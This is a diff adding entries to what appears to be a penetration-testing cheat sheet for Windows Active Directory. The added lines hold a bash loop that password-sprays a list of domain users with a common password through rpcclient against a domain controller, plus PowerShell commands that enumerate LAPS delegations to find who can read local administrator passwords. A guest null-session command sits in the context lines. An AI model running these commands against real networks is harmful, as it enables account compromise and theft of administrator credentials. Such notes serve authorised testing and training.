@@ -51,5 +51,15 @@ View windows account errors:
 ```
 net use \\DC01\ip$ "" /u:guest
 ```
+Internal Password Spraying through Linux:
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <dc> | grep Authority; done
+```
 
+Microsoft LAPS Enumeration:
+```
+Find-LAPSDelegatedGroups
+Find-AdmPwdExtendedRights
+Get-LAPSComputers
+```
 
